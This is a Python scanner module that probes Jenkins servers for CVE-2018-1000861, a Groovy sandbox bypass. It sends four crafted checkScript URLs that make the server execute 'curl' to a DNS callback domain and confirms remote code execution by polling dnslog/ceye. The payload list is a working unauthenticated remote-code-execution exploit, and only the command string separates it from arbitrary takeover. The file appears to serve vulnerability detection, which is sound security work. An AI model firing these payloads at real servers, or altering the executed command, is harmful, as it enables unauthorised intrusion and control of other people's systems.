#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

cve_2018_1000861_payloads = [
    {'path': 'securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"curl DNSDOMAIN".execute()}}'},
    {'path': 'user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"curl DNSDOMAIN".execute()}}'},
    {'path': 'admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"curl DNSDOMAIN".execute()}}'},
    {'path': 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"curl DNSDOMAIN".execute()}}'}
]
    
def cve_2018_1000861_scan(self, clients):
    ''' Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误
            检查操作是没有沙盒的, 攻击者可以通过Meta-Programming的方式, 在检查这个步骤时执行任意命令
    '''
    client = clients.get('reqClient')
    sessid = 'ae9b030320374b97c35d76dfbe5c5eb6'

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2018-1000861',
    }

    for payload in cve_2018_1000861_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path'].replace('DNSDOMAIN', dns_domain) # * Path

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)
        if (dns.result(md, sessid)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
